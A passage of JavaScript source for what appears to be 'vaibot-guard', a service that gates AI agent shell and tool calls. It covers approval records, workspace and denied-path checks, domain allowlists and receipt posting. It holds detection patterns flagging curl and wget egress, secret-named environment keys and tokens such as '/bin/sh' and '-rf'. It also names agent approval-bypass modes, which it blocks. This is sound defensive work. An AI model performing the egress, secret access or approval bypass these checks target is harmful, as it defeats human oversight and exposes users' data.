  out.sort((a, b) => Date.parse(b.createdAt || 0) - Date.parse(a.createdAt || 0));
  return out;
}

function createApproval({ sessionId, kind, reason, request, approvalId: approvalIdIn }) {
  pruneApprovals();
  const approvalId = String(approvalIdIn || `appr_${randomUUID()}`);
  const createdAt = nowIso();
  const expiresAt = new Date(Date.now() + VAIBOT_APPROVAL_TTL_MS).toISOString();

  const rec = {
    schema: "vaibot-guard/approval@0.1",
    approvalId,
    sessionId,
    kind,
    reason,
    status: "pending",
    createdAt,
    expiresAt,
    request,
    usedAt: null,
    resolvedAt: null,
  };

  writeApproval(rec);
  return rec;
}

function resolveApproval({ approvalId, action }) {
  const rec = readApproval(approvalId);
  if (!rec) return { ok: false, error: "Approval not found" };

  // expire pending approvals lazily
  if (rec.status === "pending" && isApprovalExpired(rec)) {
    rec.status = "expired";
  }

  if (rec.status !== "pending") {
    return { ok: false, error: `Cannot resolve approval in status '${rec.status}'` };
  }

  if (action === "approve") rec.status = "approved";
  else if (action === "deny") rec.status = "denied";
  else return { ok: false, error: "Invalid action" };

  rec.resolvedAt = nowIso();
  writeApproval(rec);

  return { ok: true, approvalId: rec.approvalId, status: rec.status, expiresAt: rec.expiresAt, reason: rec.reason, request: rec.request };
}

function markApprovalUsed({ approvalId }) {
  const rec = readApproval(approvalId);
  if (!rec) return;
  rec.status = "used";
  rec.usedAt = nowIso();
  writeApproval(rec);
}

function runCtxPath(runId) {
  return path.join(RUNCTX_DIR, `${runId}.json`);
}

function writeRunContext(runId, ctx) {
  const p = runCtxPath(runId);
  const tmp = p + ".tmp";
  fs.writeFileSync(tmp, stableStringify(ctx) + "\n");
  fs.renameSync(tmp, p);
}

function readRunContext(runId) {
  const p = runCtxPath(runId);
  if (!fs.existsSync(p)) return null;
  try {
    return JSON.parse(fs.readFileSync(p, "utf8"));
  } catch {
    return null;
  }
}

function deleteRunContext(runId) {
  const p = runCtxPath(runId);
  try { fs.rmSync(p); } catch {}
}

// Local service auth (recommended): when set, require bearer token for all mutating endpoints.
const VAIBOT_GUARD_TOKEN = process.env.VAIBOT_GUARD_TOKEN || "";

// Prove modes:
// - off: never call /prove
// - best-effort: call /prove but do not block on failure
// - required: if prove fails (or config missing) for high-risk actions, deny (fail-closed)
const VAIBOT_PROVE_MODE = (process.env.VAIBOT_PROVE_MODE || "best-effort").toLowerCase();

function sha256(s) {
  return createHash("sha256").update(s).digest("hex");
}

// Reserved for future improvements (e.g., migrating checkpoint hashing to SHA3-512).
// For now, keep checkpoint hashing consistent with the Merkle/event hashing (sha256).
const VAIBOT_CHECKPOINT_HASH_ALG = (process.env.VAIBOT_CHECKPOINT_HASH_ALG || "").toLowerCase();
function hashCheckpoint(data) {
  // Intentionally ignore VAIBOT_CHECKPOINT_HASH_ALG for now (future migration knob).
  return sha256(data);
}

// Deterministic JSON serialization (stable key order) for hashing.
// Values JSON can't hold follow JSON.stringify: an undefined (or function)
// property is omitted, and becomes null inside an array. Emitting the literal
// text `undefined` instead made the output invalid JSON — a run context written
// that way read back as null (its receipt lost the whole intent), and an audit
// line written that way can't be parsed.
function stableStringify(value) {
  if (value === null || value === undefined) return JSON.stringify(value);
  if (typeof value !== "object") return JSON.stringify(value);
  if (Array.isArray(value)) {
    return "[" + value.map((v) => (v === undefined || typeof v === "function" ? "null" : stableStringify(v))).join(",") + "]";
  }
  const keys = Object.keys(value)
    .filter((k) => value[k] !== undefined && typeof value[k] !== "function")
    .sort();
  return "{" + keys.map((k) => JSON.stringify(k) + ":" + stableStringify(value[k])).join(",") + "}";
}

function nowIso() {
  return new Date().toISOString();
}

function json(res, statusCode, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(statusCode, {
    "content-type": "application/json; charset=utf-8",
    "content-length": Buffer.byteLength(body),
  });
  res.end(body);
}

function getBearer(req) {
  const h = req.headers["authorization"] || req.headers["Authorization"];
  if (!h) return "";
  const s = Array.isArray(h) ? h[0] : String(h);
  const m = s.match(/^Bearer\s+(.+)$/i);
  return m ? m[1].trim() : "";
}

function requireAuth(req, res) {
  if (!VAIBOT_GUARD_TOKEN) return true; // auth disabled
  const bearer = getBearer(req);
  const alt = req.headers["x-vaibot-guard-token"];
  const token = bearer || (Array.isArray(alt) ? alt[0] : (alt ? String(alt) : ""));
  if (token !== VAIBOT_GUARD_TOKEN) {
    json(res, 401, { ok: false, error: "Unauthorized" });
    return false;
  }
  return true;
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = "";
    req.on("data", (chunk) => {
      data += chunk;
      if (data.length > 1024 * 1024) {
        reject(new Error("body too large"));
        req.destroy();
      }
    });
    req.on("end", () => resolve(data));
    req.on("error", reject);
  });
}

// ---- Policy (loaded at startup; restart service to apply policy changes)

function matchToken(tokens, joined) {
  // Tokens are literal words (local + signed denyTokens). Escape regex metachars
  // so a signed token can never inject a pattern or throw on an invalid regex;
  // skip empty tokens. `\b` is a word/non-word transition, so only anchor an edge
  // that is itself a word char — otherwise a token like ".env", "-rf" or "/bin/sh"
  // INVERTS (misses the real invocation, fires on look-alikes). Bare-word families
  // (curl, ssh, apt-get) get both boundaries; punctuation-edged tokens get none.
  return tokens.find((t) => {
    const s = String(t);
    const esc = s.replace(/[.*+?^${}()|[\]\\-]/g, "\\$&");
    if (!esc) return false;
    const left = /^\w/.test(s) ? "\\b" : "";
    const right = /\w$/.test(s) ? "\\b" : "";
    try {
      return new RegExp(`${left}${esc}${right}`, "i").test(joined);
    } catch {
      return false;
    }
  });
}

// (policy helpers moved below: isDomainAllowlisted / isDeniedPath)

function validateIntent(intent) {
  if (!intent || typeof intent !== "object") return "Missing intent";
  // Minimal fields per SKILL.md schema (relaxed: allow extra fields)
  const required = ["tool", "action", "command", "cwd"];
  for (const k of required) {
    if (!(k in intent)) return `intent missing field: ${k}`;
  }
  return null;
}

function normalizeCwdForIntent(intentCwd) {
  const cwd = typeof intentCwd === "string" && intentCwd.length ? intentCwd : WORKSPACE_REAL;
  try { return fs.realpathSync(cwd); } catch { return path.resolve(cwd); }
}

function resolveIntentPath(p, intentCwd) {
  const cwdReal = normalizeCwdForIntent(intentCwd);
  const raw = String(p);
  const abs = path.isAbsolute(raw) ? path.resolve(raw) : path.resolve(cwdReal, raw);

  // If target exists, realpath it (symlinks resolved).
  try {
    const full = fs.realpathSync(abs);
    return { abs, full, exists: true };
  } catch {
    // If it doesn't exist, resolve the nearest existing parent directory.
    const parent = path.dirname(abs);
    try {
      const parentReal = fs.realpathSync(parent);
      const full = path.join(parentReal, path.basename(abs));
      return { abs, full, exists: false };
    } catch {
      // Can't resolve parent => treat as outside.
      return { abs, full: abs, exists: false, unresolved: true };
    }
  }
}

function isInsideWorkspace(resolvedFullPath) {
  const rel = path.relative(WORKSPACE_REAL, resolvedFullPath);
  return rel === "" || (!rel.startsWith("..") && !path.isAbsolute(rel));
}

function expandTilde(p) {
  const s = String(p || "");
  if (!s.startsWith("~/")) return s;
  const home = process.env.HOME || "";
  return home ? path.join(home, s.slice(2)) : s;
}

function isDeniedPath(p) {
  const s0 = expandTilde(p);
  if (!s0) return false;
  const s = path.resolve(s0);
  return [...DENY_PATHS, ...(SIGNED_DENYPATHS || [])].some((dp0) => {
    const dp = path.resolve(expandTilde(dp0));
    return s === dp || s.startsWith(dp + path.sep);
  });
}

function isDomainAllowlisted(dest) {
  // Tight allowlist semantics (fail-closed):
  // - If allowlist is empty: NOTHING is allowlisted — the caller escalates the
  //   destination to human approval rather than allowing it.
  // - Exact host match is allowed.
  // - Subdomains are ONLY allowed when the allowlist entry is explicitly wildcarded as "*.example.com".
  if (ALLOWLISTED_DOMAINS.length === 0) return false;
  try {
    const u = new URL(dest);
    const host = u.hostname.toLowerCase();
    return ALLOWLISTED_DOMAINS.some((entry0) => {
      const entry = String(entry0 || "").trim().toLowerCase();
      if (!entry) return false;

      if (entry.startsWith("*.")) {
        const base = entry.slice(2);
        if (!base) return false;
        // Allow both the base domain and any subdomain.
        return host === base || host.endsWith("." + base);
      }

      // Exact only.
      return host === entry;
    });
  } catch {
    return false;
  }
}

function classifyRisk({ intent, cmd, args }) {
  // Risk classes are MVP: low | high
  // High risk when:
  // - explicit network destinations present
  // - any file write/delete is requested (especially outside workspace)
  // - command includes known network egress tokens
  // - env_keys includes suspicious keys (basic heuristic)

  const joined = [cmd, ...(args || [])].join(" ");

  // Network destinations
  const dests = intent?.network?.destinations;
  if (Array.isArray(dests) && dests.length > 0) {
    const anyNotAllowlisted = dests.some((d) => !isDomainAllowlisted(String(d)));
    return anyNotAllowlisted
      ? { risk: "high", reason: "network destinations not allowlisted" }
      : { risk: "high", reason: "network destinations present (allowlisted)" };
  }

  // File mutations
  const writes = intent?.files?.write;
  const dels = intent?.files?.delete;
  const mut = ([]).concat(Array.isArray(writes) ? writes : [], Array.isArray(dels) ? dels : []);
  if (mut.length > 0) {
    for (const p of mut) {
      const r = resolveIntentPath(p, intent.cwd);
      if (isDeniedPath(r.abs) || isDeniedPath(r.full)) return { risk: "high", reason: "file mutation in denied path" };
      if (r.unresolved || !isInsideWorkspace(r.full)) return { risk: "high", reason: "file mutation outside workspace" };
    }
    return { risk: "high", reason: "file mutation requested" };
  }

  // Egress primitives in command
  if (matchToken(["curl", "wget"], joined)) return { risk: "high", reason: "network egress primitive" };

  // Secret-adjacent env access (very light heuristic)
  const envKeys = intent?.env_keys;
  if (Array.isArray(envKeys) && envKeys.some((k) => /key|token|secret|pass/i.test(String(k)))) {
    return { risk: "high", reason: "secret-like env_keys requested" };
  }

  return { risk: "low", reason: "no high-risk signals" };
}

// Map the fine-grained classifier risk (safe/low/medium/high/dangerous) and the coarse
// structural risk (low/high) onto the receipt's risk_level scale, taking the HIGHER of the
// two. This keeps risk_level consistent with the decision: a gated command carries the
// classifier's medium/high, a structural hit (network/file) carries high — so "low" on a
// receipt genuinely means the action was allowed as safe, never a gated action mislabeled.
function mergeReceiptRisk(coarse, classifierRisk) {
  const N = { safe: 0, low: 0, medium: 1, high: 2, critical: 3, dangerous: 3 };
  const LEVELS = ["low", "medium", "high", "critical"];
  const c = N[String(coarse ?? "low").toLowerCase()] ?? 0;
  const k = classifierRisk != null ? (N[String(classifierRisk).toLowerCase()] ?? 0) : 0;
  return LEVELS[Math.max(0, Math.min(3, Math.max(c, k)))];
}

// Stable id for the policy rule behind a decision. A host keys its "approve for
// the rest of this session" grain off it, so it names the rule AND its subject
// where the subject matters — approving writes to one directory, or traffic to
// one host, must not approve every directory or every host.
function ruleIdFor(kind, subject) {
  const s = String(subject ?? "")
    .toLowerCase()
    .replace(/[^a-z0-9._~/-]+/g, "-")
    .replace(/-{2,}/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 96);
  return s ? `${kind}:${s}` : kind;
}

function hostOf(url) {
  try {
    return new URL(String(url)).hostname;
  } catch {
    return String(url || "");
  }
}

function dirOf(p) {
  return collapseHome(path.dirname(String(p || "")));
}

// A breaker reports whether its host is running with approvals switched off
// (Hermes --yolo, Claude Code bypassPermissions, …). Only a literal `true`
// counts; the mechanism is a short label for the receipt and is trusted for
// nothing else.
function parseHostBypass(raw) {
  const active = raw?.active === true;
  const m = typeof raw?.mechanism === "string" ? raw.mechanism.trim() : "";
  return { active, mechanism: active && /^[a-z0-9][a-z0-9:._-]{0,63}$/i.test(m) ? m : null };
}

// Apply the policy's hostBypassAction to an escalation. While a bypass is active
// the host grants any approval request before a human sees it, so an "approve"
// verdict would silently become an allow. Only escalations change: a deny —
// the catastrophic floor included — and an allow pass through untouched.
function applyHostBypass(decision, hostBypass) {
  if (!hostBypass.active || decision?.decision !== "approve") return decision;
  if (EFFECTIVE_HOST_BYPASS_ACTION === "approve") return { ...decision, bypassOverride: true };
  const via = hostBypass.mechanism ? ` (${hostBypass.mechanism})` : "";
  return {
    decision: "deny",
    reason: `Approval bypass is active${via}, and policy blocks actions that need approval while it is. Needed approval for: ${decision.reason}`,
    ...(decision.ruleId ? { ruleId: decision.ruleId } : {}),
    ...(decision.risk !== undefined ? { risk: decision.risk } : {}),
    bypassBlocked: true,
  };
}

function decideExec({ sessionId, cmd, args, intent }) {
  if (CONTAINMENT_ARMED) return containmentDecision();
  const err = validateIntent(intent);
  if (err) return { decision: "deny", reason: err, ruleId: "intent-invalid" };

  const joined = [cmd, ...(args || [])].join(" ");

  // D: signed-policy denylist + classifier dangerous-deny (safety floor).
  if (SIGNED_DENYLIST.includes(String(cmd))) return { decision: "deny", reason: "Denied by signed policy denylist", ruleId: ruleIdFor("denylist", cmd) };
  const clsExec = classify({ tool: "exec", input: { command: joined } }, { tables: CLASSIFIER_TABLES, escalateAt: SIGNED_ESCALATE_AT, guardPort: PORT });
  // floor:true marks the un-overridable catastrophic floor (Tier-0) so clients
  // can enforce it even in observe mode.
  if (clsExec.verdictHint === "deny") return { decision: "deny", reason: `Classifier: ${clsExec.reasons[0] || "dangerous"}`, floor: true, ruleId: ruleIdFor("floor", clsExec.reasons[0]) };

  // ---- File mutation posture (fail-closed)
  // If intent indicates filesystem mutation outside the workspace boundary or in a denied path,
  // deny outright. This prevents symlink/path traversal confusion from being treated as "just high risk".
  const writes = intent?.files?.write;
  const dels = intent?.files?.delete;
  const mut = ([]).concat(Array.isArray(writes) ? writes : [], Array.isArray(dels) ? dels : []);
  if (mut.length > 0) {
    for (const p of mut) {
      const r = resolveIntentPath(p, intent.cwd);
      if (isDeniedPath(r.abs) || isDeniedPath(r.full)) {
        const ruleId = ruleIdFor("file-denied-path", dirOf(r.full || r.abs));
        if (FILE_MUTATION_DENIED_PATH_ACTION === "approve") {
          return { decision: "approve", reason: "File mutation touches denied path", approvalId: `appr_${randomUUID()}`, ruleId };
        }
        return { decision: "deny", reason: "File mutation touches denied path", ruleId };
      }
      if (r.unresolved || !isInsideWorkspace(r.full)) {
        const ruleId = ruleIdFor("file-outside-workspace", dirOf(r.full || r.abs));
        if (EFFECTIVE_FILEMUT_ACTION === "approve") {
          return { decision: "approve", reason: "File mutation outside workspace", approvalId: `appr_${randomUUID()}`, ruleId };
        }
        return { decision: "deny", reason: "File mutation outside workspace", ruleId };
      }
    }
  }

  // ---- Token posture
  const deny = matchToken([...DENY_TOKENS, ...(SIGNED_DENYTOKENS || [])], joined);
  if (deny) return { decision: "deny", reason: `Denied token: ${deny}`, ruleId: ruleIdFor("token-deny", deny) };

  // ---- Network posture
  // If destinations present and not allowlisted, require approval.
  const dests = intent?.network?.destinations;
  if (Array.isArray(dests) && dests.length > 0) {
    const notAllowlisted = dests.filter((d) => !isDomainAllowlisted(String(d)));
    if (notAllowlisted.length > 0) {
      return {
        decision: "approve",
        reason: "Network destination not allowlisted",
        approvalId: `appr_${randomUUID()}`,
        // Several destinations share one approval only if they are the same set.
        ruleId: ruleIdFor("network", notAllowlisted.map((d) => hostOf(d)).sort().join(",")),
      };
    }
  }

  // Approve/ask token lane — two sources, two policies:
  //  - SIGNED_APPROVETOKENS = the user's EXPLICIT "ask on this" policy → honored unconditionally.
  //  - APPROVE_TOKENS = the built-in heuristic net → AND-conditioned on classifier concurrence:
  //    a substring match only pauses a command the classifier ALSO rates non-safe. A match on a
  //    classifier-safe command (".env" in a config grep, "curl" in a localhost health check,
  //    "ncat" in a "\ncat" heredoc) must NOT pause — the classifier's "safe" verdict wins. Real
  //    egress still pauses because the classifier itself rates it HIGH. (See the egress /
  //    exfiltration threat-model note: secret reads are benign; exfil is the risk.)
  const signedApprove = matchToken(SIGNED_APPROVETOKENS || [], joined);
  if (signedApprove) {
    return { decision: "approve", reason: `Approval required for token: ${signedApprove}`, approvalId: `appr_${randomUUID()}`, ruleId: ruleIdFor("token-approve", signedApprove) };
  }
  const builtinApprove = matchToken(APPROVE_TOKENS, joined);
  if (builtinApprove && clsExec.verdictHint !== "allow") {
    return { decision: "approve", reason: `Approval required for token: ${builtinApprove}`, approvalId: `appr_${randomUUID()}`, ruleId: ruleIdFor("token-approve", builtinApprove) };
  }

  // Fail-closed baseline: ONLY a classifier-safe action falls through to allow.
  // Anything the classifier rates ask (unknown/medium/high-risk command not
  // caught above) escalates to human approval rather than being silently allowed
  // — matching the offline breaker, which denies the same input.
  if (clsExec.verdictHint === "allow") {
    return { decision: "allow", reason: "Allowed by baseline policy", risk: clsExec.risk };
  }
  return {
    decision: "approve",
    risk: clsExec.risk,
    reason: `Escalated for approval (${clsExec.risk}): ${clsExec.reasons?.[0] || "unrecognized command"}`,
    approvalId: `appr_${randomUUID()}`,
    ruleId: ruleIdFor("classifier", `${clsExec.risk}:${clsExec.reasons?.[0] || "unrecognized command"}`),
  };
}

// ---------------------------------------------------------------------------
// Tool (generic) decisions — used by the per-host circuit-breaker plugins.
// ---------------------------------------------------------------------------

function extractPathsFromToolParams(params) {
  // Heuristic: common path keys used by agent tool calls.
  const keys = [
    "path",
    "file_path",
    "filePath",
    "oldPath",
    "newPath",
    "directory",
    "cwd",
    "outPath",
    "jsonlPath",
  ];

  const out = [];
  if (!params || typeof params !== "object") return out;

  for (const k of keys) {
    const v = params[k];
    if (typeof v === "string" && v.trim()) out.push(v);
    if (Array.isArray(v)) {
      for (const item of v) if (typeof item === "string" && item.trim()) out.push(item);
    }
  }

  return out;
}

function extractUrlFromToolParams(params) {
  if (!params || typeof params !== "object") return "";
  const v = params.url || params.targetUrl || params.target_url;
  return typeof v === "string" ? v : "";
}

function classifyToolRisk({ toolName, params, workspaceDir }) {
  // MVP risk classes: low | high
  // This is intentionally conservative: we mark outbound/network/mutation as high.

  const tn = String(toolName || "").toLowerCase();
  const url = extractUrlFromToolParams(params);
  // The classifier's tool kind covers host vocabularies the name heuristics below
  // miss (write_file, patch, web_extract). Exec is deliberately NOT keyed off it:
  // that would rate every `ls` high and undo the low-risk receipt tier.
  const kind = toolKind(tn, CLASSIFIER_TABLES);

  // Network tools
  if (url && /^(https?:)?\/\//i.test(url)) {
    const allowlisted = isDomainAllowlisted(url);
    return allowlisted
      ? { risk: "high", reason: "network destination present (allowlisted)" }
      : { risk: "high", reason: "network destination not allowlisted" };
  }
  if (kind === "network" || tn.includes("web_fetch") || tn.includes("browser") || tn.includes("fetch")) {
    return { risk: "high", reason: "network/browsing tool" };
  }

  // Explicit outbound messaging
  if (tn.startsWith("message") || tn.includes("message")) {
    return { risk: "high", reason: "outbound messaging tool" };
  }

  // Shell / remote execution
  if (tn === "exec" || tn.includes("exec") || tn.includes("run")) {
    return { risk: "high", reason: "execution tool" };
  }

  // File mutations (classifier kind, else heuristic by tool name)
  if (kind === "write" || /(^|\b)(write|edit|patch|apply|delete|rm|mkdir|upload)(\b|$)/i.test(tn)) {
    return { risk: "high", reason: "file mutation tool" };
  }

  // Reads are usually low risk, but reading denied paths is sensitive.
  if (tn === "read" || tn.includes("read")) {
    const paths = extractPathsFromToolParams(params);
    const anyDenied = paths.some((p) => isDeniedPath(p));
    if (anyDenied) return { risk: "high", reason: "read touches denied path" };
    return { risk: "low", reason: "read-only tool" };
  }

  return { risk: "low", reason: "default low risk" };
}

function decideTool({ sessionId, toolName, params, workspaceDir }) {
  if (CONTAINMENT_ARMED) return containmentDecision();
  const tn = String(toolName || "");
  // Fail-closed: an unidentified tool call cannot be governed → deny.
  if (!tn.trim()) return { decision: "deny", reason: "Missing tool name", ruleId: "tool-missing" };
  const joined = tn + " " + (() => {
    try {
      return JSON.stringify(params || {});
    } catch {
      return "{unserializable:true}";
    }
  })();

  // D: signed-policy denylist (safety floor) + classifier dangerous-deny —
  // checked before the guard's own token/rule posture so they can only ADD denies.
  if (SIGNED_DENYLIST.includes(tn)) return { decision: "deny", reason: "Denied by signed policy denylist", ruleId: ruleIdFor("denylist", tn) };
  const cls = classify({ tool: toolName, input: params }, { tables: CLASSIFIER_TABLES, escalateAt: SIGNED_ESCALATE_AT, guardPort: PORT });
  // floor:true marks the un-overridable catastrophic floor (Tier-0).
  if (cls.verdictHint === "deny") return { decision: "deny", reason: `Classifier: ${cls.reasons[0] || "dangerous"}`, floor: true, ruleId: ruleIdFor("floor", cls.reasons[0]) };

  // Token posture (applies across all tools)
  const deny = matchToken([...DENY_TOKENS, ...(SIGNED_DENYTOKENS || [])], joined);
  if (deny) return { decision: "deny", reason: `Denied token: ${deny}`, ruleId: ruleIdFor("token-deny", deny) };

  // Approve/ask token lane — signed tokens honored unconditionally; the built-in heuristic net is
  // AND-conditioned on classifier concurrence (see decideExec + the egress threat-model note).
  const signedApprove = matchToken(SIGNED_APPROVETOKENS || [], joined);
  if (signedApprove) return { decision: "approve", reason: `Approval required for token: ${signedApprove}`, approvalId: `appr_${randomUUID()}`, ruleId: ruleIdFor("token-approve", signedApprove) };
  const builtinApprove = matchToken(APPROVE_TOKENS, joined);
  if (builtinApprove && cls.verdictHint !== "allow") return { decision: "approve", reason: `Approval required for token: ${builtinApprove}`, approvalId: `appr_${randomUUID()}`, ruleId: ruleIdFor("token-approve", builtinApprove) };

  // Tool-specific posture
  const lower = tn.toLowerCase();

  // Outbound messaging: default approval gate.
  if (lower.startsWith("message") || lower.includes("message")) {
    return { decision: "approve", reason: "Outbound messaging requires approval", approvalId: `appr_${randomUUID()}`, ruleId: ruleIdFor("messaging", tn) };
  }

  // Network/browsing: allow allowlisted destinations, otherwise require approval.
  const url = extractUrlFromToolParams(params);
  if (url) {
    if (!isDomainAllowlisted(url)) {
      return { decision: "approve", reason: "Network destination not allowlisted", approvalId: `appr_${randomUUID()}`, ruleId: ruleIdFor("network", hostOf(url)) };
    }
    return { decision: "allow", reason: "Allowlisted network destination" };
  }

  // File mutation: deny/approve based on workspace boundary + denied paths. Keyed
  // off the classifier's tool kind as well as the name: the name regex needs
  // `write`/`edit` as a whole word, so write_file, patch, MultiEdit, NotebookEdit
  // and apply_patch all slipped past it and were never boundary-checked.
  if (toolKind(tn, CLASSIFIER_TABLES) === "write" || /(^|\b)(write|edit|delete|upload)(\b|$)/i.test(lower)) {
    const paths = extractPathsFromToolParams(params);
    for (const p of paths) {
      const r = resolveIntentPath(p, workspaceDir);
      if (isDeniedPath(r.abs) || isDeniedPath(r.full)) {
        const ruleId = ruleIdFor("file-denied-path", dirOf(r.full || r.abs));
        if (FILE_MUTATION_DENIED_PATH_ACTION === "approve") {
          return { decision: "approve", reason: "File mutation touches denied path", approvalId: `appr_${randomUUID()}`, ruleId };
        }
        return { decision: "deny", reason: "File mutation touches denied path", ruleId };
      }
      if (r.unresolved || !isInsideWorkspace(r.full)) {
        const ruleId = ruleIdFor("file-outside-workspace", dirOf(r.full || r.abs));
        if (EFFECTIVE_FILEMUT_ACTION === "approve") {
          return { decision: "approve", reason: "File mutation outside workspace", approvalId: `appr_${randomUUID()}`, ruleId };
        }
        return { decision: "deny", reason: "File mutation outside workspace", ruleId };
      }
    }
  }

  // Reads: allow by default, but reading denied paths requires approval.
  if (lower === "read" || lower.includes("read")) {
    const paths = extractPathsFromToolParams(params);
    const denied = paths.find((p) => isDeniedPath(p));
    if (denied) return { decision: "approve", reason: "Read touches denied path", approvalId: `appr_${randomUUID()}`, ruleId: ruleIdFor("read-denied-path", dirOf(expandTilde(denied))) };
    return { decision: "allow", reason: "Allowed read" };
  }

  // Fail-closed baseline: only a classifier-safe tool falls through to allow.
  // Unknown / unrecognized / third-party (mcp__*) tools the classifier rates ask
  // escalate to human approval rather than being silently allowed.
  if (cls.verdictHint === "allow") {
    return { decision: "allow", reason: "Allowed by baseline tool policy", risk: cls.risk };
  }
  return {
    decision: "approve",
    risk: cls.risk,
    reason: `Escalated for approval (${cls.risk}): ${cls.reasons?.[0] || "unrecognized tool"}`,
    approvalId: `appr_${randomUUID()}`,
    ruleId: ruleIdFor("classifier", `${cls.risk}:${cls.reasons?.[0] || "unrecognized tool"}`),
  };
}

function postVaibotProve({ receipt, idempotencyKey }) {
  if (VAIBOT_PROVE_MODE === "off") return Promise.resolve(null);
  if (!PROVENANCE_BASE || !VAIBOT_API_KEY) return Promise.resolve(null);

  const url = new URL(PROVENANCE_BASE.replace(/\/$/, "") + "/prove");
  const body = JSON.stringify({
    content: JSON.stringify({ ...receipt, intent: redactIntent(receipt.intent) }),
    contentType: "application/json",
    encoding: "utf-8",
    model: VAIBOT_PROVE_MODEL,
    metadata: {
      schema: receipt.schema,
      kind: receipt.kind,
      runId: receipt.runId,
      sessionId: receipt.sessionId,
    },
    idempotencyKey,
  });

  const options = {
    method: "POST",
    hostname: url.hostname,
    port: url.port || 443,
    path: url.pathname,
    headers: {
      "content-type": "application/json; charset=utf-8",
      "content-length": Buffer.byteLength(body),
      "authorization": `Bearer ${VAIBOT_API_KEY}`,
    },
    timeout: 8000,
  };

  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try {
          const parsed = JSON.parse(data || "{}");
          if (res.statusCode && res.statusCode >= 200 && res.statusCode < 300) return resolve(parsed);
          reject(new Error(`vaibot /prove failed (${res.statusCode}): ${data.slice(0, 200)}`));
        } catch (e) {
          reject(new Error(`vaibot /prove invalid JSON: ${data.slice(0, 200)}`));
        }
      });
    });
    req.on("timeout", () => req.destroy(new Error("vaibot /prove timeout")));
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

/**
 * postGovernanceReceipt — Post a canonical governance receipt to VAIBot API v2.
 * Called best-effort on every finalize (tool or exec). Targets the V2 governance
 * base (e.g. https://api.vaibot.io) → POST {GOVERNANCE_BASE}/v2/receipts, the same
 * host/routing the effective-mode poll uses — never the V1 provenance host.
 */
// How a breaker says an approval was granted, and — when the host asked its own
// question on top (Hermes' dangerous-command prompt) — what the human answered.
// Closed vocabularies: anything else is dropped rather than written to a receipt.
const APPROVAL_SCOPES = new Set(["prompt", "session-grant"]);
const APPROVAL_CHOICES = new Set(["once", "session", "always", "deny", "timeout"]);
const HOST_APPROVAL_CHOICES = new Set(["once", "session", "always", "deny", "timeout", "smart_approve", "smart_deny"]);
const HOST_APPROVAL_SURFACES = new Set(["cli", "gateway", "smart"]);

function hostApprovalFrom(raw) {
  if (!raw || typeof raw !== "object" || !HOST_APPROVAL_CHOICES.has(raw.choice)) return null;
  return { choice: raw.choice, surface: HOST_APPROVAL_SURFACES.has(raw.surface) ? raw.surface : null };
}

// A containment deny is the one decide-time verdict that earns its own
// governance receipt.
//
// Every other deny is covered by the tier-1 ledger plus the finalize receipt.
// But a contained action never runs, so no post-tool hook fires, so no finalize
// ever happens — and an incident would leave NOTHING in the control plane at
// exactly the moment the record matters most. The local tamper-evident log
// still has it, but that log lives on the machine you may be containing
// precisely because you do not trust it.
//
// Fire-and-forget: a receipt that cannot be posted must never hold up a deny.
function postContainmentDenyReceipt({ runId, sessionId, intent, decision, risk, effectiveMode }) {
  if (decision?.floor !== true || !CONTAINMENT_ARMED) return;
  postGovernanceReceipt({
    runId,
    sessionId,
    intent,
    decision,
    risk,
    // The action did not run, and under containment that is true in observe
    // mode too — receiptOutcome's `floor` input carries that.
    result: { ok: false, outcome: "blocked" },
    policyVersion: POLICY.version,
    effectiveMode,
  }).catch((e) => console.error(`[vaibot-guard] containment receipt post failed: ${e?.message || e}`));
}

function postGovernanceReceipt({ runId, sessionId, intent, decision, risk, result, policyVersion, effectiveMode, hostBypass }) {
  if (!GOVERNANCE_BASE || !VAIBOT_API_KEY) return Promise.resolve(null);

  const toolName = String(intent?.toolName || intent?.tool || intent?.cmd?.split(" ")[0] || "unknown");
  // Tool-call intents carry `params`, not a cmd/command string, so `command` used to
  // fall through to the bare tool name — a receipt read `command: "Write"` with no
  // indication of WHICH file was written. That left `cwd` (the agent's process cwd)
  // as the only location on the receipt, which for a file mutation is not where the
  // action landed, making receipts look misattributed. Name the target explicitly,
  // using the same extractor decideTool uses for the boundary check so the receipt
  // reports exactly what the decision governed.
  const targets = extractPathsFromToolParams(intent?.params).map((p) => collapseHome(String(p)));
  const command = String(
    intent?.cmd ||
    intent?.command ||
    (targets.length ? `${toolName} ${targets.join(" ")}` : toolName),
  ).slice(0, 500);
  const cwd = collapseHome(String(intent?.workspaceDir || intent?.cwd || "/"));

  const guardDecision = String(decision?.decision || "deny");
  // Map guard decision names to governance receipt decision names
  const mappedDecision = guardDecision === "approve" ? "approval_required" : guardDecision;

  // Receipt honesty: report the risk the DECISION engine actually saw. `risk` is the coarse
  // structural detector (network/file/curl/secret → high); `decision.risk` is the fine-grained
  // classifier verdict that DROVE the gate. Merge them so risk_level ALWAYS matches the action
  // — a gated command is never labeled "low", and a genuinely-safe (classifier-allow) one
  // stays low. This ends the "low-risk but gated" receipts.
  const riskLevel = mergeReceiptRisk(risk?.risk, decision?.risk);

  // Receipt honesty (approval resolution): this function runs ONLY from the
  // finalize handlers, so a gated run that reaches here has already been
  // answered — the human either approved it in the agent's native prompt (the
  // tool then ran, and PostToolUse finalized) or rejected it (a sweep hook
  // finalizes with approval:"denied"). Emitting the decide-time "pending" here
  // is what left every approved action parked in the dashboard queue forever.
  //
  // Observe mode is the exception: nothing was enforced, so nobody was ever
  // asked. The server keys shadow rows off observe_mode and filters them out
  // of the pending queue, so keep the uniform "pending" and flag the mode
  // instead of inventing a human decision that never happened.
  const observing = normalizeMode(effectiveMode || EFFECTIVE_MODE) === "observe";
  const humanDenied =
    result?.approval === "denied" || result?.outcome === "denied_by_reviewer";
  const bypassed = decision?.bypassOverride === true && !humanDenied;

  // One pure function owns the (verdict x mode x what-came-back) mapping, so
  // "pending" is emitted only for a gate that is genuinely still outstanding.
  const shape = receiptOutcome({
    guardDecision,
    effectiveMode: observing ? "observe" : "enforce",
    result,
    bypassOverride: decision?.bypassOverride === true,
    floor: decision?.floor === true,
  });
  const approvalStatus = shape.approvalStatus;
  // How it was granted (a prompt now, or a grant the human made earlier this
  // session) and which answer they gave — only meaningful for a resolved gate.
